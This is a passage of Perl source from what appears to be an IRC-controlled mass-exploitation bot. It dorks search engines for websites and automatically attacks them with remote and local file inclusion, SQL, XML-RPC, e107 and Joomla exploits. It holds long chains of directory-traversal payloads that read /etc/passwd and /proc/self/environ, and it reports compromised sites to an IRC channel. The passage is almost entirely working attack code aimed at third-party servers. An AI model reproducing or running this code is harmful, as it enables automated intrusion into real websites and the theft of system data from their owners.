  irc_msg($to,$colz{14}.$typez{$type}." DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{4}." $sb");

  irc_msg($to,$colz{14}."BuGz:".$colz{9}." $bug ") if ($type != 3);
  irc_msg($to,$colz{14}."DoRkz:".$colz{9}." $dork ");
  s_cari($to,$dork,$sb,$bug,$type);
  s_eksploit(1,$to,$bug,$dork,$sb) if ($type == 1);
  irc_msg($to,$colz{14}.$typez{$type}." SeLeSai!".$colz{9}." $dork ".$colz{1}."ID: $sb");
  return;
  }
  elsif($autodom == 2){
  foreach my $Domains(@domini){


  my %typez = (
    1 => "Auto DorkZ RFI & LFI & XML & SQL ScaNneR",
    2 => "Auto DorkZ RFI & LFI & XML & SQL ScaN & ExpLoiT",
    3 => "Auto DorkZ JooMLa MaSs ScaN & ExpLoiT"
  );
  my $badbug  = cek_bug($bug);
  if ($badbug == 1)  { irc_msg($to,$colz{4}."BuGnya JeLek!".$colz{12}." ScaNNinG DiCanCeL"); return; }
  my $baddork = cek_dork($Domains." ".$dork);
  if ($baddork == 1) { irc_msg($to,$colz{4}."DorKnya JeLek!".$colz{12}." ScaNNinG DiCanCeL"); return; }
  if ($type == 3) {
    my $h = bugjoomla("hitung");
    if ($h == 0) { msge($to,"Joomla",$colz{4}."BuGnya Ga BiSa DiLoaD!".$colz{12}." ScaNNinG DiCanCeL"); return; }
  }
  irc_msg($to,$colz{9}."MeMeRikSa ReSpoN..");
  my $stat = cek_respon($to);
  if ($stat != 2) { irc_msg($to,$colz{4}."ReSpoN Ga BeKerJa!".$colz{12}." ScaNning diCaNCeL!"); return; }

  irc_msg($to,$colz{14}.$typez{$type}." DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{4}." $sb");

  irc_msg($to,$colz{14}."BuGz:".$colz{9}." $bug ") if ($type != 3);
  irc_msg($to,$colz{14}."DoRkz:".$colz{9}." ".$Domains." ".$dork);
  s_cari($to,$Domains." ".$dork,$sb,$bug,$type);
  s_eksploit(1,$to,$bug,$Domains." ".$dork,$sb) if ($type == 1);
  irc_msg($to,$colz{14}.$typez{$type}." SeLeSai!".$colz{9}." ".$Domains." ".$dork.$colz{1}." ID: $sb");

  }
  return;
  }
}

sub crsql_scanz {
  my ($to,$bug,$dork,$sb,$type,$autodom) = @_;
  $sb = "cr".$sb.".txt";
  $dork = bersihdork($to,$dork);
  my @domini = SiteDomains();
  if($autodom == 1){
  if ($type == 1){
  my $badbug  = cek_bug($bug);
  if ($badbug == 1)  { irc_msg($to,$colz{4}."BuGnya JeLek!".$colz{12}." ScaNNinG DiCanCeL"); return; }
  }
  my $baddork = cek_dork($dork);
  if ($baddork == 1) { irc_msg($to,$colz{4}."DorKnya JeLek!".$colz{12}." ScaNNinG DiCanCeL"); return; }
  if ($type == 1){
  irc_msg($to,$colz{14}.$colz{4}."SQL ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{4}." $sb");
  crsql_cari($to,$bug,$dork,$sb,1);
  }
  if ($type == 2){
  irc_msg($to,$colz{14}.$colz{4}."XML ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{4}." $sb");
  crsql_cari($to,$bug,$dork,$sb,2);
  }
  if ($type == 3){
  irc_msg($to,$colz{14}.$colz{4}."e107 ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{4}." $sb");
  crsql_cari($to,$bug,$dork,$sb,3);
  }
  if ($type == 4){
  irc_msg($to,$colz{14}.$colz{4}."XSSLFI ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{4}." $sb");
  crsql_cari($to,$bug,$dork,$sb,4);
  }

  irc_msg($to,$colz{14}."BuGz:".$colz{9}." $bug ");
  irc_msg($to,$colz{14}."DoRkz:".$colz{9}." $dork ");

  if ($type == 1){ irc_msg($to,$colz{14}."SQL ScaN & ExpLoiT SeLeSai!".$colz{9}." $dork ".$colz{1}."ID: $sb"); }
  if ($type == 2){ irc_msg($to,$colz{14}."XML ScaN & ExpLoiT SeLeSai!".$colz{9}." $dork ".$colz{1}."ID: $sb"); }
  if ($type == 3){ irc_msg($to,$colz{14}."e107 ScaN & ExpLoiT SeLeSai!".$colz{9}." $dork ".$colz{1}."ID: $sb"); }
  if ($type == 4){ irc_msg($to,$colz{14}."XSSLFI ScaN & ExpLoiT SeLeSai!".$colz{9}." $dork ".$colz{1}."ID: $sb"); }
  return;
  }

  elsif($autodom == 2){
  foreach my $Domains(@domini){
  if ($type == 1){
  my $badbug  = cek_bug($bug);
  if ($badbug == 1)  { irc_msg($to,$colz{4}."BuGnya JeLek!".$colz{12}." ScaNNinG DiCanCeL"); return; }
  }

  my $baddork = cek_dork($Domains." ".$dork);
  if ($baddork == 1) { irc_msg($to,$colz{4}."DorKnya JeLek!".$colz{12}." ScaNNinG DiCanCeL"); return; }
  if ($type == 1){
  irc_msg($to,$colz{14}.$colz{9}."Auto DorkZ SQL ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{4}." $sb");
  crsql_cari($to,$bug,$Domains." ".$dork,$sb,1);
  }
  if ($type == 2){
  irc_msg($to,$colz{14}.$colz{9}."Auto DorkZ XML ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{4}." $sb");
  crsql_cari($to,$bug,$Domains." ".$dork,$sb,2);
  }
  if ($type == 3){
  irc_msg($to,$colz{14}.$colz{9}."Auto DorkZ e107 ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{4}." $sb");
  crsql_cari($to,$bug,$Domains." ".$dork,$sb,3);
  }
  if ($type == 4){
  irc_msg($to,$colz{14}.$colz{4}."XSSLFI ScaN & ExpLoiT DiMuLai! $colz{14} ".$conf{rfipid}."/PID ID:".$colz{4}." $sb");
  crsql_cari($to,$bug,$Domains." ".$dork,$sb,4);
  }

  irc_msg($to,$colz{14}."BuGz:".$colz{9}." $bug ");
  irc_msg($to,$colz{14}."DoRkz:".$colz{9}." ".$Domains." ".$dork);

  if ($type == 1){ irc_msg($to,$colz{14}."Auto DorkZ SQL ScaN & ExpLoiT SeLeSai!".   $colz{12}." ".$Domains." ".$dork." ".$colz{1}."ID: $sb"); }
  if ($type == 2){ irc_msg($to,$colz{14}."Auto DorkZ XML ScaN & ExpLoiT SeLeSai!".   $colz{12}." ".$Domains." ".$dork." ".$colz{1}."ID: $sb"); }
  if ($type == 3){ irc_msg($to,$colz{14}."Auto DorkZ e107 ScaN & ExpLoiT SeLeSai!".  $colz{12}." ".$Domains." ".$dork." ".$colz{1}."ID: $sb"); }
  if ($type == 4){ irc_msg($to,$colz{14}."Auto DorkZ XSSLFI ScaN & ExpLoiT SeLeSai!".$colz{12}." ".$Domains." ".$dork." ".$colz{1}."ID: $sb"); }
  }
  return;
  }
}

sub s_eksploit {
  #Type: 1 = Biasa, 2 = Cari dan exploit, 3 = Joomla
  #Engine: Kosong = Eksploit total, Ada = Eksploit per engine
  my ($type,$chan,$bug,$dork,$tf,$engine) = @_;
  my @prosesbaru;
  my @semuatarget;
  my $hitung;
  my $num = 0;
  my @bugjoomla = bugjoomla($chan) if ($type == 3);
  unless (open(FILEZ,"< $tf")) { msge($chan,"FILE",$colz{4}."Ga BiSa BuKa $tf!"); return; }
  while (my $r = <FILEZ>) { $r =~ s/\n//g; push(@semuatarget,$r); }
  close(FILEZ);
  f_hapus($tf);
  my @kotor = lnk_sortir(@semuatarget);
  my @target = lnk_filter(@kotor);
  if (!$engine) {
    irc_msg($chan,$colz{14}."HaSiL PeNCaRiaN".$colz{9}." $dork");
    irc_msg($chan,$colz{14}."ToTaL: ".$colz{13}." ".scalar(@semuatarget)." ".$colz{14}."KoToR: "." ".$colz{13}.scalar(@kotor)." ".$colz{14}."BeRsih: ".$colz{13}." ".scalar(@target).$colz{2}." ID: $tf ".$colz{7}."ExpLoiTaSi DiMuLai!");
  }
  foreach my $situs (@target) {
    $hitung++;
    if ($hitung % $conf{rfipid} == 0) {
      foreach my $f (@prosesbaru) { waitpid($f,0); }
      $num = 0;
    }
    if ($type == 1 && $hitung % $conf{rficnt} == 0) {
      irc_msg($dbgchan,$situs) if ($conf{showsite} == 1);
      irc_msg($chan,$colz{14}." ".$hitung." $colz{13} ".scalar(@target));
    }
    if ($type != 1 && $hitung % $conf{rficnt2} == 0) {
      irc_msg($dbgchan,$situs) if ($conf{showsite} == 1);
      irc_msg($chan,$colz{14}." $engine ".$colz{13}." ".$hitung." ".$colz{1}." => ".$colz{12}." ".scalar(@target). " ");
    }
    $prosesbaru[$num] = fork();
    if ($prosesbaru[$num] == 0) {
      if ($type != 3) {
        my $q = bukasitus("http://".$situs.$bug.$Ckrid."?");
        if ($q =~ /Casper_Kae/) { safemode(1,$chan,$situs,$bug,$engine); sleep($conf{sleepz}); 				}
	elsif($q =~ /failed to open stream/){
	my $qlfi = bukasitus("http://".$situs.$bug.$lfitest);
	my $qlfienviron;
		if ($qlfi =~ /HTTP_USER_AGENT/){ safemode(1,$chan,$situs,$bug.$lfitest."&casper=",$engine); sleep($conf{sleepz});	}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../etc/passwd%00".$colz{1}." ]");}}}

		else {
			$q = bukasitus("http://".$situs.$bug.$xsslfitst);
			if ($q =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/)				{ irc_msg($chan,"[".$colz{9}."XSSLFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../etc/passwd/[512b]/..".$colz{1}."]");		}			
		}
	}
	else {
		$q = bukasitus("http://".$situs.$bug.$rcetest);
		if ($q =~ /casperkae/) { irc_msg($chan,"[".$colz{9}."RCE".$colz{1}."][".$colz{12}." http://".$situs.$bug." ".$colz{1}."]".$colz{14}." "); }
	}
      }
      else {
        foreach my $bug (@bugjoomla) {
        my $q = bukasitus("http://".$situs.$bug.$Ckrid."?");
        if ($q =~ /Casper_Kae/) { safemode(1,$chan,$situs,$bug,$engine); sleep($conf{sleepz}); 			}
	elsif($q =~ /failed to open stream/){
		my $qlfi = bukasitus("http://".$situs.$bug.$lfitest);
		my $qlfienviron;
		if ($qlfi =~ /HTTP_USER_AGENT/){ safemode(1,$chan,$situs,$bug.$lfitest."&casper=",$engine); sleep($conf{sleepz});	}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
		elsif ($qlfi !~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){ $qlfi = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../etc/passwd%00"); if ($qlfi =~ /root:(.+):(.+):(.+):(.+):(.+):(.+)/){$qlfienviron = bukasitus("http://".$situs.$bug."../../../../../../../../../../../../../../../../proc/self/environ%00"); if($qlfienviron =~ /HTTP_USER_AGENT/){safemode(1,$chan,$situs,$bug."../../../../../../../../../../../../../../../../proc/self/environ%00&casper=",$engine); sleep($conf{sleepz});}else{ irc_msg($chan,"[".$colz{9}."LFI".$colz{1}."][".$colz{12}." http://".$situs.$bug."../../../../../../../../../../../../../../../../etc/passwd%00".$colz{1}." ]");}}}
